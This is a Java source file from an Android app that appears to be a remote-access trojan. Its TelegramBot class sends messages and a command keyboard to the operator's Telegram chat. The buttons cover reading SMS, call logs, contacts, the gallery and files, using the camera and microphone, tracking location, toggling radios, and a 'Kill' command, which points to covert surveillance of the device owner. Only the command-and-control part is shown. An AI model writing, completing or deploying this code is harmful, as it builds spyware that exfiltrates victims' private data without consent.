package com.my.luck.network;

import android.content.Context;
import android.util.Log;
import org.json.JSONArray;
import org.json.JSONObject;
import java.io.DataOutputStream;
import java.net.HttpURLConnection;
import java.net.URL;

public class TelegramBot {
    private static final String TAG = "TelegramBot";
    private static final String API = "https://api.telegram.org/bot";
    private String token;
    private String owner;
    private Context context;

    public TelegramBot(Context context, String token, String owner) {
        this.context = context;
        this.token = token;
        this.owner = owner;
    }

    public void sendMessage(String text) {
        new Thread(() -> {
            try {
                String url = API + token + "/sendMessage";
                HttpURLConnection conn = (HttpURLConnection) new URL(url).openConnection();
                conn.setRequestMethod("POST");
                conn.setRequestProperty("Content-Type", "application/json");
                conn.setDoOutput(true);

                JSONObject data = new JSONObject();
                data.put("chat_id", owner);
                data.put("text", text);
                data.put("parse_mode", "HTML");

                DataOutputStream out = new DataOutputStream(conn.getOutputStream());
                out.writeBytes(data.toString());
                out.flush();
                out.close();

                int code = conn.getResponseCode();
                Log.d(TAG, "Message sent, code: " + code);
                conn.disconnect();
            } catch (Exception e) {
                Log.e(TAG, "Error", e);
            }
        }).start();
    }

    public void sendKeyboard() {
        new Thread(() -> {
            try {
                String url = API + token + "/sendMessage";
                HttpURLConnection conn = (HttpURLConnection) new URL(url).openConnection();
                conn.setRequestMethod("POST");
                conn.setRequestProperty("Content-Type", "application/json");
                conn.setDoOutput(true);

                JSONObject data = new JSONObject();
                data.put("chat_id", owner);
                data.put("text", "🎮 <b>CONTROL</b>\nTap a button:");

                JSONObject kb = new JSONObject();
                JSONArray rows = new JSONArray();

                // Row 1
                JSONArray r1 = new JSONArray();
                r1.put(new JSONObject().put("text", "📱 SMS"));
                r1.put(new JSONObject().put("text", "📞 Call Log"));
                r1.put(new JSONObject().put("text", "👤 Contacts"));
                rows.put(r1);

                // Row 2
                JSONArray r2 = new JSONArray();
                r2.put(new JSONObject().put("text", "🖼️ Gallery"));
                r2.put(new JSONObject().put("text", "📂 Files"));
                r2.put(new JSONObject().put("text", "📷 Camera"));
                rows.put(r2);

                // Row 3
                JSONArray r3 = new JSONArray();
                r3.put(new JSONObject().put("text", "🎤 Record"));
                r3.put(new JSONObject().put("text", "📍 Location"));
                r3.put(new JSONObject().put("text", "ℹ️ Info"));
                rows.put(r3);

                // Row 4
                JSONArray r4 = new JSONArray();
                r4.put(new JSONObject().put("text", "📶 WiFi On"));
                r4.put(new JSONObject().put("text", "📶 WiFi Off"));
                r4.put(new JSONObject().put("text", "💡 Flash On"));
                r4.put(new JSONObject().put("text", "💡 Flash Off"));
                rows.put(r4);

                // Row 5
                JSONArray r5 = new JSONArray();
                r5.put(new JSONObject().put("text", "🔵 BT On"));
                r5.put(new JSONObject().put("text", "🔵 BT Off"));
                r5.put(new JSONObject().put("text", "🗑️ Kill"));
                rows.put(r5);

                kb.put("keyboard", rows);
                kb.put("resize_keyboard", true);

                data.put("reply_markup", kb);

                DataOutputStream out = new DataOutputStream(conn.getOutputStream());
                out.writeBytes(data.toString());
                out.flush();
                out.close();

                Log.d(TAG, "Keyboard sent");
                conn.disconnect();
            } catch (Exception e) {
                Log.e(TAG, "Error", e);
            }
        }).start();
    }
}
